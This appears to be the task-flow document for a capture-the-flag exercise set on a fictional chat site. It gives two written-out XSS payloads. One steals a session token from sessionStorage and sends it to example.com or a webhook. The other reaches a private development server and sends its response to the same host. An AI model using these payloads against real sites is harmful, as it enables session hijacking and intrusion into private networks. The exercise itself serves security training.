## Task flow
### Task 0: Stealing the session token
Player logs in using credentials provided in the e-mail. After that, the chatting site is presented and user is able to read and send messages.
 - **Scenario:**:
    In this task player has to steal the session token of the person that he's chatting with (Robert Carlson). Player's messages are read once per minute. User can achieve this goal by exploiting Cross-Side Scripting (XSS) vulnerability.
    Exemplary payload:
    ```javascript
    <img/src/onerror=fetch('http://example.com/?cookie='+sessionStorage.getItem('token'));>
    ```
    where example.com can be replaced by url to webhook created, for example, on https://webhook.site
 - **Objective:**: The token is can be utilized to log in as other user by replacing player's token with the token obtained by xss. When player is logged in as other user, he can read his conversations. One of them will contain a flag.

### Task 1: Accessing resource in victim's private network
Having victim's conversations, player's goal is to access a private resource mentioned in one of them using Cross-Site Request Forgery attack.
 - **Scenario:**:
    One of Robert Carlson's conversations his friend encourages Robert to test the website that he's developing. We can see that this is not a public domain, so both of them need to share the same private network. We can utilize CSRF technique by constructing new XSS payload, that is connecting to the private server, and sending the server's response back to our webhook.
    Exemplary payload:
    ```javascript
    <img/src/onerror="
    const r = new XMLHttpRequest();
    r.open('GET', 'http://devserver.jake.local',false);
    r.send(null);
    const x =r.responseText;
    fetch('http://example.com/?cookie=' +r.responseText)">
    ```

 - **Objective:** Get a response from the private development server.
